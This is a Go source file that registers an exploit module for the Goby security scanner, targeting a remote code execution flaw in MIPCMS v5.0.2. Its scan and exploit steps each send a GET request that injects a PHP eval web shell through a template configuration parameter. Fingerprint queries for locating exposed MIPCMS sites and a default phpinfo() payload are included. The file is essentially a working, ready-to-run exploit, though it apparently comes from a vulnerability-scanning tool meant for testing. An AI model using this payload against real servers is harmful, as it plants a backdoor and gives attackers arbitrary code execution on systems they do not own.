package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "mipcms index siteview rce",
    "Description": "There is an arbitrary code execution vulnerability in mipcms v5.0.2, which can be used by an attacker to execute arbitrary code, write a backdoor, and obtain server permissions.\\n",
    "Impact": "mipcms index siteview rce",
    "Recommendation": "<p>1.Set access policy and whitelist access through firewall and other security devices.</p><p>2. If not necessary, access to the system from the public network is prohibited.</p>",
    "Product": "MIPCMS-CMS",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "MIPCMS 建站系统 index 文件 siteview 参数 远程代码执行漏洞",
            "Description": "<p>MIPCMS是一套免费开源的CMS建站系统。<br></p><p>MIPCMS v5.0.2中存在任意代码执行漏洞，攻击者可以利用该漏洞执行任意代码、编写后门、获取服务器权限。<br></p>",
            "Impact": "<p>MIPCMS v5.0.2 中存在任意代码执行漏洞，攻击者可以利用该漏洞执行任意代码、编写后门、获取服务器权限。<br></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.mipcms.com/\">https://www.mipcms.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "MIPCMS内容管理系统",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "mipcms index siteview rce",
            "Description": "There is an arbitrary code execution vulnerability in mipcms v5.0.2, which can be used by an attacker to execute arbitrary code, write a backdoor, and obtain server permissions.\\n",
            "Impact": "mipcms index siteview rce",
            "Recommendation": "<p>1.Set access policy and whitelist access through firewall and other security devices.</p><p><span style=\"color: var(--primaryFont-color);\">2. If not necessary, access to the system from the public network is prohibited.</span></p>",
            "Product": "MIPCMS-CMS",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"MIPCMS内容管理系统-基于百度MIP开发的建站系统\") || body=\"/default/css/mipcms.css\" || body=\"/mip-form/mip-form.js\"",
    "GobyQuery": "(title=\"MIPCMS内容管理系统-基于百度MIP开发的建站系统\") || body=\"/default/css/mipcms.css\" || body=\"/mip-form/mip-form.js\"",
    "Author": "gobysec@gmail.com",
    "Homepage": "https://www.mipjz.com/",
    "DisclosureDate": "2021-06-18",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?s=/index/index/siteview&parent=index/index&config[tpl_replace_string][<!DOCTYPE]=<?php+@eval($_GET%5Ba%5D);?><!DOCTYPE&a=echo+md5(123);&config[tpl_cache]=0",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?s=/index/index/siteview&parent=index/index&config[tpl_replace_string][<!DOCTYPE]=<?php+@eval($_GET%5Ba%5D);?><!DOCTYPE&a=echo+md5(123);&config[tpl_cache]=0",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "eval",
            "type": "input",
            "value": "phpinfo();",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10223"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
